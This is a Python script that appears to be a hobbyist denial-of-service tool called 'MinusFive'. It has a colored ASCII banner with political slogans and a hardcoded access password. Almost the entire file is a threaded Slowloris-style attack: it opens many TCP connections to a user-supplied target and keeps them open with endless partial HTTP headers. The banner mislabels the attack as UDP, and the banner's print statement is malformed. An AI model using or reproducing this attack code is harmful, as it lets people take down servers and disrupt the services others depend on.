import socket
import threading
import time
import getpass
import os

# CLEAR
def clear():
    os.system('clear')

# Colored ASCII Art for "MinusFive" using '|_' style
def ascii_art_MinusFive():
    print("""
\033[1;31m   @@   @    °@  @@   @    @@    @    @@ @
\033[1;31m  @@  @  @   @@  @@ @  @   @@    @   @@
\033[1;34m  @@  @  @   @@  @@    @   @@    @    @@
\033[1;34m  @@  @  @   @@  @@    @   @@    @     @@ 
\033[1;36m  ©©  @  ©   ©©  ©©    ©   ©©    ©      ©©
\033[1;36m  ©©     ©   ©©  ©©    ©    ©©  ©      ©©
\033[1;35m  °°     °   °°  °°    °     °°°     °°
\033[1;35m   °     °    °   °    °      °    °  
\033[1;31m                              @ @ @ @  @  @       @  @ @ @ @
\033[1;31m                              @        @   @     @   @
\033[1;31m                              @ @ @    @    @   @    @ @ @
\033[1;36m                              ©        ©     © ©     ©
\033[1;36m                              ©        ©      ©      © © © ©
\033[1;34m||===========================✓By:Za'99 =================================   
\033[1;35m||   T H I S   S C R I P T   I S   F O R   A T T A C K I N G   U D P   ||
\033[1;35m||                 W E  ARE  WITH  P A L E S T I N E                   ||
\033[1;34m||         B I R R U H  B I D A M N A F D I K A  Y A  A Q S H A        ||                           
\033[1;31m||=====================================================================||    
print(""\033[31m__________________________________________________________________""")
# Password authentication function
def authenticate():
    password = "BASe"  # The password to access the tool
    user_password = getpass.getpass(prompt="\033[1;36mEnter the password to access the tool: \033[0m")
    if user_password != password:
        print("\033[1;31mIncorrect password. Exiting...\033[0m")
        exit()

# Optimized Slowloris function with threading for faster execution
def slowloris_thread(target, port):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(4)
        s.connect((target, port))
        s.send(f"GET /? HTTP/1.1\r\nHost: {target}\r\nUser-Agent: Mozilla/5.0\r\n".encode())

        # Faster loop to send partial headers
        while True:
            s.send(b"X-a: b\r\n")
            time.sleep(0.01)  # Further reduced delay to make it faster
    except socket.error:
        print("\033[1;31mConnection error. Could not send data.\033[0m")
        return

def slowloris(target, port, num_threads):
    for i in range(num_threads):
        thread = threading.Thread(target=slowloris_thread, args=(target, port))
        thread.start()
        print(f"\033[1;33mSent MinusFive ====>> attacking message {i + 1} \033[0m")

if __name__ == "__main__":
    clear()  
    # Clear the screen before showing anything
    ascii_art_MinusFive()  # Display the colorful ASCII art for "MinusFive"

    authenticate()  # Authenticate after displaying ASCII art

    target = input("\033[1;36mEnter the target IP or domain: \033[0m")
    port = int(input("\033[1;36mEnter the port number: \033[0m"))
    num_threads = int(input("\033[1;36mEnter the number of threads (more = faster): \033[0m"))

    slowloris(target, port, num_threads)

    print(f"\033[1;31mThank you for using my tool\033[0m")

    print(f"\033[1;31mmy github id: https://github.com/KunFay99/MinusFife-DDoS\033[0m")

    print(f"\033[1;31mpress ctrl + z\033[0m")
